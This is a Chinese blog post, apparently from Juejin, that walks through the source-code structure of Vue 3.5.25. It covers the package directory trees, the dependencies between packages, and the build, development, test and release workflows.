content="2025-12-16T04:06:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端水很深"/> <meta itemprop="url" content="https://juejin.cn/user/3562890820588077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 3 源码项目结构详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3562890820588077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端水很深
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T04:06:47.000Z" title="Tue Dec 16 2025 04:06:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>基于版本：Vue 3.5.25</strong></p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fcore%2Ftree%2Fv3.5.25" target="_blank" title="https://github.com/vuejs/core/tree/v3.5.25" ref="nofollow noopener noreferrer">源码地址</a></strong></p>
<h2 data-id="heading-0">1. 项目概览</h2>
<p>Vue 3 是一个渐进式 JavaScript 框架，用于构建用户界面。它采用了模块化的架构设计，将核心功能拆分为多个独立的包，以实现更好的代码组织、可维护性和按需引入。</p>
<h2 data-id="heading-1">2. 根目录结构</h2>
<pre><code class="hljs language-bash" lang="bash">vuejs/core/
├── .github/            <span class="hljs-comment"># GitHub 配置文件</span>
├── .vscode/            <span class="hljs-comment"># VSCode 配置文件</span>
├── .well-known/        <span class="hljs-comment"># 知名配置文件</span>
├── changelogs/         <span class="hljs-comment"># 版本变更日志</span>
├── packages/           <span class="hljs-comment"># 核心包目录</span>
├── packages-private/   <span class="hljs-comment"># 私有包目录（测试、工具等）</span>
├── scripts/            <span class="hljs-comment"># 构建和开发脚本</span>
├── .git-blame-ignore-revs <span class="hljs-comment"># Git blame 忽略文件</span>
├── .gitignore          <span class="hljs-comment"># Git 忽略文件</span>
├── .node-version       <span class="hljs-comment"># Node.js 版本要求</span>
├── .prettierignore     <span class="hljs-comment"># Prettier 忽略文件</span>
├── .prettierrc         <span class="hljs-comment"># Prettier 配置</span>
├── BACKERS.md          <span class="hljs-comment"># 支持者列表</span>
├── CHANGELOG.md        <span class="hljs-comment"># 主变更日志</span>
├── FUNDING.json        <span class="hljs-comment"># 资助信息</span>
├── LICENSE             <span class="hljs-comment"># 许可证</span>
├── README.md           <span class="hljs-comment"># 项目说明</span>
├── SECURITY.md         <span class="hljs-comment"># 安全信息</span>
├── eslint.config.js    <span class="hljs-comment"># ESLint 配置</span>
├── netlify.toml        <span class="hljs-comment"># Netlify 配置</span>
├── package.json        <span class="hljs-comment"># 项目依赖和脚本</span>
</code></pre>
<h2 data-id="heading-2">3. 核心包结构 (packages/)</h2>
<p>Vue 3 的核心功能被拆分为多个独立的包，每个包负责特定的功能域。</p>
<h3 data-id="heading-3">3.1 compiler-core</h3>
<p>核心编译器，提供跨平台的编译能力，与具体渲染目标无关。</p>
<pre><code class="hljs language-python" lang="python">compiler-core/
├── __tests__/          <span class="hljs-comment"># 测试文件</span>
├── src/
│   ├── compat/         <span class="hljs-comment"># 兼容性处理</span>
│   ├── transforms/     <span class="hljs-comment"># AST 转换插件</span>
│   ├── ast.ts          <span class="hljs-comment"># AST 节点定义</span>
│   ├── codegen.ts      <span class="hljs-comment"># 代码生成器</span>
│   ├── <span class="hljs-built_in">compile</span>.ts      <span class="hljs-comment"># 编译主函数</span>
│   ├── parser.ts       <span class="hljs-comment"># 模板解析器</span>
│   └── transform.ts    <span class="hljs-comment"># AST 转换器</span>
├── LICENSE
├── README.md
└── package.json
</code></pre>
<h3 data-id="heading-4">3.2 compiler-dom</h3>
<p>DOM 编译器，基于 compiler-core 扩展，用于将模板编译为 DOM 渲染函数。</p>
<pre><code class="hljs language-bash" lang="bash">compiler-dom/
├── __tests__/          <span class="hljs-comment"># 测试文件</span>
├── src/
│   ├── transforms/     <span class="hljs-comment"># DOM 特定转换</span>
│   └── index.ts        <span class="hljs-comment"># 入口文件</span>
├── LICENSE
├── README.md
└── package.json
</code></pre>
<h3 data-id="heading-5">3.3 compiler-sfc</h3>
<p>单文件组件 (SFC) 编译器，用于编译 .vue 文件。</p>
<pre><code class="hljs language-bash" lang="bash">compiler-sfc/
├── __tests__/          <span class="hljs-comment"># 测试文件</span>
├── src/
│   ├── script/         <span class="hljs-comment"># 脚本处理</span>
│   ├── style/          <span class="hljs-comment"># 样式处理</span>
│   ├── template/       <span class="hljs-comment"># 模板处理</span>
│   ├── compileScript.ts <span class="hljs-comment"># 脚本编译</span>
│   ├── compileStyle.ts <span class="hljs-comment"># 样式编译</span>
│   ├── compileTemplate.ts <span class="hljs-comment"># 模板编译</span>
│   └── parse.ts        <span class="hljs-comment"># SFC 解析器</span>
├── LICENSE
├── README.md
└── package.json
</code></pre>
<h3 data-id="heading-6">3.4 compiler-ssr</h3>
<p>服务端渲染 (SSR) 编译器，用于将模板编译为 SSR 渲染函数。</p>
<pre><code class="hljs language-bash" lang="bash">compiler-ssr/
├── __tests__/          <span class="hljs-comment"># 测试文件</span>
├── src/
│   ├── transforms/     <span class="hljs-comment"># SSR 特定转换</span>
│   └── index.ts        <span class="hljs-comment"># 入口文件</span>
├── LICENSE
├── README.md
└── package.json
</code></pre>
<h3 data-id="heading-7">3.5 reactivity</h3>
<p>响应式系统核心，实现了 Vue 3 的响应式机制。</p>
<pre><code class="hljs language-csharp" lang="csharp">reactivity/
├── __benchmarks__/     <span class="hljs-meta"># 基准测试</span>
├── __tests__/          <span class="hljs-meta"># 测试文件</span>
├── src/
│   ├── effect.ts       <span class="hljs-meta"># 副作用系统</span>
│   ├── reactive.ts     <span class="hljs-meta"># 响应式对象</span>
│   ├── <span class="hljs-keyword">ref</span>.ts          <span class="hljs-meta"># 响应式引用</span>
│   ├── computed.ts     <span class="hljs-meta"># 计算属性</span>
│   └── watch.ts        <span class="hljs-meta"># 监听器</span>
├── LICENSE
├── README.md
└── package.json
</code></pre>
<h3 data-id="heading-8">3.6 reactivity-transform</h3>
<p><strong>注意：该包已被移除</strong></p>
<p>响应式转换，曾提供实验性的响应式语法转换功能。根据 Vue 3.4 的变更日志，该功能在 Vue 3.3 中被标记为弃用，并在 Vue 3.4 中被完全移除。</p>
<p><strong>替代方案</strong>：</p>
<ul>
<li>用户如果想要继续使用响应式转换功能，可以通过 <a href="https://link.juejin.cn?target=https%3A%2F%2Fvue-macros.dev%2Ffeatures%2Freactivity-transform.html" target="_blank" title="https://vue-macros.dev/features/reactivity-transform.html" ref="nofollow noopener noreferrer">Vue Macros 插件</a> 来实现。</li>
<li>官方推荐使用标准的 <code>ref()</code>、<code>reactive()</code> 和 <code>computed()</code> API 替代。</li>
</ul>
<h3 data-id="heading-9">3.7 runtime-core</h3>
<p>核心运行时，提供与平台无关的运行时功能，是Vue 3跨平台能力的基础。</p>
<pre><code class="hljs language-bash" lang="bash">runtime-core/
├── __tests__/          <span class="hljs-comment"># 测试文件</span>
├── src/
│   ├── component.ts    <span class="hljs-comment"># 组件系统</span>
│   ├── renderer.ts     <span class="hljs-comment"># 渲染器</span>
│   ├── vnode.ts        <span class="hljs-comment"># 虚拟节点</span>
│   ├── scheduler.ts    <span class="hljs-comment"># 调度器</span>
│   └── h.ts            <span class="hljs-comment"># 创建虚拟节点的函数</span>
├── LICENSE
├── README.md
└── package.json
</code></pre>
<p><strong>详细解析敬请关注</strong></p>
<h3 data-id="heading-10">3.8 runtime-dom</h3>
<p>DOM 运行时，基于 runtime-core 扩展，提供 DOM 特定的运行时功能。</p>
<pre><code class="hljs language-bash" lang="bash">runtime-dom/
├── __tests__/          <span class="hljs-comment"># 测试文件</span>
├── src/
│   ├── components/     <span class="hljs-comment"># DOM 特定组件</span>
│   ├── directives/     <span class="hljs-comment"># DOM 特定指令</span>
│   ├── modules/        <span class="hljs-comment"># DOM 模块</span>
│   ├── nodeOps.ts      <span class="hljs-comment"># DOM 节点操作</span>
│   └── patchProp.ts    <span class="hljs-comment"># 属性补丁</span>
├── LICENSE
├── README.md
└── package.json
</code></pre>
<h3 data-id="heading-11">3.9 runtime-test</h3>
<p>测试运行时，用于测试 Vue 组件和功能。</p>
<h3 data-id="heading-12">3.10 server-renderer</h3>
<p>服务器渲染器，用于将 Vue 组件渲染为 HTML 字符串。</p>
<h3 data-id="heading-13">3.11 shared</h3>
<p>共享工具函数，供其他包使用。</p>
<h3 data-id="heading-14">3.12 vue</h3>
<p>主包，整合了核心功能，提供完整的 Vue 3 API。</p>
<pre><code class="hljs language-bash" lang="bash">vue/
├── __tests__/          <span class="hljs-comment"># 测试文件</span>
├── src/
│   ├── index.ts        <span class="hljs-comment"># 入口文件</span>
│   └── runtime.ts      <span class="hljs-comment"># 运行时入口</span>
├── LICENSE
├── README.md
└── package.json
</code></pre>
<h3 data-id="heading-15">3.13 vue-compat</h3>
<p>Vue 2 兼容性包，帮助从 Vue 2 迁移到 Vue 3。</p>
<h2 data-id="heading-16">4. 私有包结构 (packages-private/)</h2>
<p>私有包主要用于测试、开发工具和内部使用。</p>
<pre><code class="hljs language-csharp" lang="csharp">packages-<span class="hljs-keyword">private</span>/
├── dts-built-test/     <span class="hljs-meta"># 类型定义构建测试</span>
├── dts-test/           <span class="hljs-meta"># 类型定义测试</span>
├── sfc-playground/     <span class="hljs-meta"># SFC  playground</span>
├── template-explorer/  <span class="hljs-meta"># 模板浏览器</span>
├── vite-debug/         <span class="hljs-meta"># Vite 调试</span>
├── <span class="hljs-keyword">global</span>.d.ts         <span class="hljs-meta"># 全局类型定义</span>
└── tsconfig.json       <span class="hljs-meta"># TypeScript 配置</span>
</code></pre>
<h2 data-id="heading-17">5. 脚本目录 (scripts/)</h2>
<p>包含项目的构建、开发和发布脚本。</p>
<pre><code class="hljs language-bash" lang="bash">scripts/
├── aliases.js          <span class="hljs-comment"># 别名配置</span>
├── build.js            <span class="hljs-comment"># 构建脚本</span>
├── dev.js              <span class="hljs-comment"># 开发脚本</span>
├── inline-enums.js     <span class="hljs-comment"># 枚举内联脚本</span>
├── pre-dev-sfc.js      <span class="hljs-comment"># SFC 开发前置脚本</span>
├── release.js          <span class="hljs-comment"># 发布脚本</span>
├── setup-vitest.ts     <span class="hljs-comment"># Vitest 配置</span>
├── size-report.js      <span class="hljs-comment"># 大小报告脚本</span>
├── usage-size.js       <span class="hljs-comment"># 使用大小脚本</span>
├── utils.js            <span class="hljs-comment"># 工具函数</span>
├── verify-commit.js    <span class="hljs-comment"># 提交验证脚本</span>
└── verify-treeshaking.js <span class="hljs-comment"># 树摇验证脚本</span>
</code></pre>
<h2 data-id="heading-18">6. 包之间的依赖关系</h2>
<p>Vue 3 的包之间存在清晰的依赖关系，以下是详细的依赖关系图：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">vue
├── compiler-sfc
│   ├── compiler-core
│   └── compiler-dom
├── runtime-dom
│   ├── runtime-core
│   │   ├── reactivity
│   │   └── <span class="hljs-keyword">shared</span>
│   └── <span class="hljs-keyword">shared</span>
└── server-renderer
    ├── compiler-ssr
    │   ├── compiler-core
    │   └── compiler-dom
    └── runtime-core
</code></pre>
<h3 data-id="heading-19">详细依赖关系图</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    subgraph 基础依赖
        shared
    end

    subgraph 编译器
        compiler-core --&gt; shared
        compiler-dom --&gt; compiler-core
        compiler-dom --&gt; shared
        compiler-ssr --&gt; compiler-core
        compiler-ssr --&gt; shared
        compiler-sfc --&gt; compiler-core
        compiler-sfc --&gt; compiler-dom
        compiler-sfc --&gt; compiler-ssr
        compiler-sfc --&gt; shared
    end

    subgraph 响应式系统
        reactivity --&gt; shared
        %% reactivity-transform --&gt; reactivity (已移除)
    end

    subgraph 运行时
        runtime-core --&gt; shared
        runtime-core --&gt; reactivity
        runtime-dom --&gt; runtime-core
        runtime-dom --&gt; shared
        server-renderer --&gt; runtime-core
        server-renderer --&gt; compiler-ssr
        server-renderer --&gt; shared
        runtime-test --&gt; runtime-core
        runtime-test --&gt; shared
    end

    subgraph 主包
        vue --&gt; compiler-sfc
        vue --&gt; runtime-dom
        vue --&gt; server-renderer
        vue --&gt; shared
        vue-compat --&gt; vue
        vue-compat --&gt; shared
    end
</code></pre>
<h3 data-id="heading-20">依赖关系说明</h3>
<ol>
<li>
<p><strong>共享依赖</strong>：</p>
<ul>
<li><code>shared</code> 包被所有其他包依赖，提供共享的工具函数</li>
</ul>
</li>
<li>
<p><strong>编译器链</strong>：</p>
<ul>
<li><code>compiler-core</code> 是所有编译器的基础</li>
<li><code>compiler-dom</code> 和 <code>compiler-ssr</code> 分别扩展 <code>compiler-core</code> 以支持 DOM 和 SSR 环境</li>
<li><code>compiler-sfc</code> 依赖 <code>compiler-core</code> 和 <code>compiler-dom</code> 来编译单文件组件</li>
</ul>
</li>
<li>
<p><strong>响应式系统</strong>：</p>
<ul>
<li><code>reactivity</code> 是响应式系统的核心</li>
</ul>
</li>
<li>
<p><strong>运行时链</strong>：</p>
<ul>
<li><code>runtime-core</code> 提供与平台无关的运行时功能</li>
<li><code>runtime-dom</code> 扩展 <code>runtime-core</code> 以支持 DOM 环境</li>
<li><code>server-renderer</code> 用于服务器端渲染</li>
</ul>
</li>
<li>
<p><strong>主包</strong>：</p>
<ul>
<li><code>vue</code> 主包整合了所有核心功能</li>
<li><code>vue-compat</code> 提供 Vue 2 兼容性支持</li>
</ul>
</li>
</ol>
<p>这种模块化的依赖设计使得 Vue 3 具有很好的可扩展性和可维护性，开发者可以根据需要只引入必要的包。</p>
<h2 data-id="heading-21">7. 构建流程</h2>
<ol>
<li>使用 <code>scripts/build.js</code> 脚本构建项目</li>
<li>支持多种构建格式：ES modules、CommonJS、UMD</li>
<li>支持开发环境和生产环境构建</li>
<li>支持按需构建特定包</li>
</ol>
<h2 data-id="heading-22">8. 开发流程</h2>
<ol>
<li>使用 <code>scripts/dev.js</code> 脚本启动开发服务器</li>
<li>支持热模块替换</li>
<li>提供 SFC playground 用于实时编辑和预览组件</li>
</ol>
<h2 data-id="heading-23">9. 测试体系</h2>
<ol>
<li>使用 Vitest 进行单元测试和基准测试</li>
<li>提供完整的 E2E 测试</li>
<li>支持类型定义测试</li>
<li>支持代码覆盖率报告</li>
</ol>
<h2 data-id="heading-24">10. 发布流程</h2>
<ol>
<li>使用 <code>scripts/release.js</code> 脚本发布版本</li>
<li>自动生成变更日志</li>
<li>支持语义化版本控制</li>
<li>自动发布到 npm</li>
</ol>
<h2 data-id="heading-25">11. 总结</h2>
<p>Vue 3 采用了模块化的架构设计，将核心功能拆分为多个独立的包，以实现更好的代码组织、可维护性和按需引入。这种设计使得 Vue 3 更加灵活、高效，并且易于扩展和定制。</p>
<p>通过了解 Vue 3 的项目结构，开发者可以更好地理解框架的内部工作原理，从而更有效地使用和扩展 Vue 3。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>